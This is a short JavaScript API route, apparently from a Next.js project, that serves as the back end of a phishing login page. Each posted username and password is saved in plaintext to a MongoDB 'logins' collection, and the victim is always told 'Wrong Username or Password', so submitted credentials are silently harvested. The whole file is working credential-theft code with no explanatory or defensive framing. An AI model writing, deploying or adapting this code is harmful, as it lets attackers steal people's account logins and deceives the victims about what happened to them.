import { connectToDatabase } from '../../utils/mongodb';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { username, password } = req.body;

        try {
            const { db } = await connectToDatabase();
            
            // Insert the user data into a "logins" collection
            await db.collection('logins').insertOne({
                username,
                password,
                timestamp: new Date(),
            });

            // Always respond with "Wrong Username or Password"
            res.status(200).json({ message: 'Wrong Username or Password' });
        } catch (error) {
            console.error(error);
            res.status(500).json({ message: 'Error saving data' });
        }
    } else {
        res.status(405).json({ message: 'Method not allowed' });
    }
}
